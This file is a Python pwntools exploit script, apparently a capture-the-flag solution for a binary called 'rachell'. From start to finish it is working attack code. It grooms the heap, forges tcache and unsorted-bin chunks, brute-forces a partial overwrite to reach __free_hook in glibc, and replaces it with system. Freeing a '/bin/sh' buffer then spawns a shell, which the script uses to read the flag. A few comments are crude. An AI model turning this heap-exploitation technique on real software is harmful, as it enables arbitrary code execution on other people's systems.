from pwn import *

while True:
    r = process("./rachell", env={"LD_PRELOAD":"./libc.so.6"})
    #r = remote("35.200.117.74", 25252)

    m = open("/proc/{}/maps".format(r.pid), "r").read()
    libc = 0
    for i in m.split("\n"):
        if "libc" in i:
            libc = int(i.split("-")[0], 16)
            break
    print(hex(libc))

    def rec():
        return r.recvuntil(">")
    rec()

    def touch(fname):
        r.sendline("touch")
        r.recvuntil(">")
        r.sendline(fname)
        rec()

    def cd(path):
        r.sendline("cd")
        r.recvuntil(">")
        r.sendline(path)
        rec()

    def echo(data, path):
        r.sendline("echo")
        r.recvuntil(">")
        r.sendline(data)
        r.recvuntil(">")
        r.sendline("y")
        r.recvuntil(">", timeout=0.5)
        r.sendline(path)
        rec()

    def rm(path):
        r.sendline("rm")
        r.recvuntil(">")
        r.sendline(path)
        rec()

    def mkdir(name):
        r.sendline("mkdir")
        r.recvuntil(">")
        r.sendline(name)
        rec()

    mkdir("a")
    mkdir("b")
    mkdir("c")
    for i in range(8):
        touch("chunk" + str(i))
    cd("tmp")
    for i in range(9):
        touch("tmp" + str(i))
    cd("..")
    cd("a")
    for i in range(9):
        touch("a" + str(i))
    cd("..")
    cd("b")
    for i in range(1):
        touch("b" + str(i))
    cd("../home")

    echo("A"*0x7d0, "../chunk2")
    echo("B"*0x800, "../chunk3")
    rm("../chunk3")
    rm("../chunk2")

    echo("A"*0x800, "../chunk0")
    echo("B"*0x800, "../chunk1")
    rm("../chunk1")
    rm("../chunk0")


    # we have chunk3 right before chunk1.
    # we alloc bigly unsorted, overlapping everything, alloc something past top, forge tcache at chunk1 and chunk3, free tcaches so we can alloc over them whenever, free bigly unsorted and alloc to overlap partial over chunk1, alloc from chunk3 to sice partial, hacc stdout win

    payload = "A"*0x7d0 + p64(0x0) + p64(0x41) + "A"*0x20 + p64(0x0) + p64(0x51)
    payload += p64(0x21)*((0x1500-len(payload))/8)
    #echo(cyclic(0x1000), "../chunk4")
    echo(payload, "../chunk4")
    echo("i"*0x10, "../chunk5")

    rm("../chunk1")
    rm("../chunk3")

    rm("../chunk4")

    echo("i"*0x800, "../chunk6")
    rm("../chunk6")

    freehook_off = 0x3ed8e8

    realsicenibble = (libc + freehook_off) & 0xffffff
    sicenibble = (random.randint(0, 0xfff) << 12) | 0x8e8
    if "\n" in p64(sicenibble):
        r.close()
        continue
    print(hex(sicenibble))
    sicenibble = realsicenibble
    nibbles = p64(sicenibble-0x8)[:3]
    # now partial
    echo("C"*0x28 + p64(0x51) + nibbles, "../chunk3")

    echo("A"*0x40, "../tmp/tmp0")
    try:
        echo("\x00"*0x40, "../tmp/tmp1") # this guy is on free hook
    except:
        print("fail")
        r.close()
        continue

    # do it again
    echo("B"*0x70, "../tmp/tmp8")
    rm("../tmp/tmp8")

    dup_size2 = 0x81
    echo("C"*0x20 + p64(0x0) + p64(dup_size2) + "C"*0x10, "../chunk3")
    rm("../chunk1")
    echo("i"*(0x800-0x80), "../chunk7")
    rm("../chunk7")
    nibbles = p64(sicenibble - 0x10)[:3]
    echo("C"*0x20 + p64(0x0) + p64(dup_size2) + nibbles, "../chunk3")

    echo("A"*0x70, "../tmp/tmp2")
    fake = p64(0x81)
    fake += "\x00"*(0x70-len(fake))
    echo(fake, "../tmp/tmp3") # this chunk is above freehook

    # another dup to write end of the chunk
    echo("B"*0x80, "../tmp/tmp7")
    rm("../tmp/tmp7")
    dup_size2 = 0x91
    echo("C"*0x20 + p64(0x0) + p64(dup_size2) + "C"*0x10, "../chunk3")
    rm("../chunk1")
    echo("i"*(0x800-0x80-0x90), "../tmp/tmp6")
    rm("../tmp/tmp6")
    nibbles = p64(sicenibble - 0x10 + 0x80)[:3]
    echo("C"*0x20 + p64(0x0) + p64(dup_size2) + nibbles, "../chunk3")

    echo("A"*0x80, "../tmp/tmp4")
    fake = p64(0x21) + p64(0x0)*3 + p64(0x21)
    fake += "\x00"*(0x80-len(fake))
    echo(fake, "../tmp/tmp5") # this chunk is below freehook

    echo("A"*(0x800-0x80-0x80), "../a/a7") # use chunk1 to fucc unsorted bin
    nibbles = p64(sicenibble - 0x10)[:3]
    echo(p64(0x0) + p64(0xcf1) + p64(0x0) + nibbles, "../chunk1")

    echo("/bin/sh\x00" + "A"*(0xce0-0x8), "../b/b0")

    systemoff = 0x4f440
    try:
        nibbles = p64(sicenibble + (systemoff - freehook_off))[:3]
    except:
        print("overflow sad")
        r.close()
        continue
    echo("A"*8 + nibbles, "../tmp/tmp1")
    #pause()
    #rm("../tmp/tmp1")

    r.sendline("rm")
    r.recvuntil(">")
    r.sendline("../b/b0")

    print("WIN?")
    r.sendline("echo 'penis'")
    a = ""
    try:
        a = r.recvuntil("penis", timeout=3)
    except:
        pass
    if "penis" in a:
        print("WIN")
        r.sendline("cat flag*")
        r.interactive()
        exit()
    else:
        print("almost :(")
        r.close()
        continue

